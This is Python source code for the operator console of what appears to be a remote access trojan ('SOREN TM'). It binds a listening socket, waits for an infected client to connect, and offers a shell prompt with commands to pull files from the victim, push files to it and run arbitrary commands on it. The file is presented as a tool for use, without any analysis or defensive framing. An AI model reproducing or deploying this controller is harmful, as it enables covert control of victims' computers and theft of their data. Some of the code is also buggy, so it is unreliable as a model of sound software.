
r"""
   _____  ____  _____  ______ _   _    _____ _    _          __  __ _      ____  _    _ 
  / ____|/ __ \|  __ \|  ____| \ | |  / ____| |  | |   /\   |  \/  | |    / __ \| |  | |
 | (___ | |  | | |__) | |__  |  \| | | (___ | |__| |  /  \  | \  / | |   | |  | | |  | |
  \___ \| |  | |  _  /|  __| | . ` |  \___ \|  __  | / /\ \ | |\/| | |   | |  | | |  | |
  ____) | |__| | | \ \| |____| |\  |  ____) | |  | |/ ____ \| |  | | |___| |__| | |__| |
 |_____/ \____/|_|  \_\______|_| \_| |_____/|_|  |_/_/    \_\_|  |_|______\____/ \____/ 

Created By SORENSHAMLOU

Module Name : SORENSHAMLOU

Create At : 2024/11/10

Update At : 2024/11/11

"""
from socket import *
from colorama import Fore
from subprocess import getoutput
from re import findall
from os.path import splitext
from datetime import datetime

socket = socket(AF_INET,SOCK_STREAM)


intro = rf"""{Fore.CYAN}
   _____  ____  _____  ______ _   _   _______ __  __ 
  / ____|/ __ \|  __ \|  ____| \ | | |__   __|  \/  |
 | (___ | |  | | |__) | |__  |  \| |    | |  | \  / |
  \___ \| |  | |  _  /|  __| | . ` |    | |  | |\/| |
  ____) | |__| | | \ \| |____| |\  |    | |  | |  | |
 |_____/ \____/|_|  \_\______|_| \_|    |_|  |_|  |_|
 """

print(intro)

def get_ipv4_address():
    while True:
        result = getoutput("ipconfig")

        ip_addresses = findall(r"   IPv4 Address. . . . . . . . . . . : (.*)", result)

        try:
            ip_address = ip_addresses[1]
        except IndexError:
            print("Could not find")
            continue
        print(f"{Fore.GREEN} IPv4 Address: {ip_address}")

        return ip_address


BYTE_SIZE = 700 * 1024 * 1024

HOST = "localhost"

PORT = 8080


ip_address = get_ipv4_address()

ip_address="localhost"

socket.bind((HOST, PORT))

socket.listen(2)


print(f"{Fore.GREEN} listening on {ip_address}:8080")

client, addr = socket.accept()

print(f"{Fore.GREEN}Connected to", addr)

def create_file_name():
    return f"{str(datetime.now().strftime('%Y%m%d_%H%M%S'))}"


def save_file(client,file_format):
    filename = create_file_name()
    with open(f"{filename}{file_format}", 'wb') as file:
        ch = client.recv(BYTE_SIZE)
        while (ch):
            file.write(ch)
            print(ch)
            if b'rat sending file = 0' in ch:
                break
            ch = client.recv(1024)
        print(f"{Fore.GREEN}File Saved!")




while True:
    print(f"Command Format : function name!command|value")

    shell = input("Shell > :")

    try:
        function_name, value = shell.split("!")
    except ValueError:
        print("Invalid Command Format")
        continue

    if function_name=="gf":
      
      client.send(shell.encode())

      filename, file_format = splitext(value)

      save_file(client,file_format)


    elif function_name=="sf":

        client.send(shell.encode())

        file_path = value.split("#")

        with open(file_path, 'rb') as file:

            filename, file_format = splitext(value)

            send_shell  = f"sf!{file.read()}#{file_format}"

            client.send(send_shell.encode())
        
        response = client.recv(BYTE_SIZE).decode(
            'UTF-8', 
            errors='ignore'
        )
        print(response)

    elif function_name=="cmd":

        client.send(shell.encode())

        response = client.recv(BYTE_SIZE).decode(
            'UTF-8',
            errors='ignore'
        )
        print(response)
    
    else:

        client.send(shell.encode())

        response = client.recv(BYTE_SIZE).decode(
            'UTF-8',
            errors='ignore'
        )

        print(response)
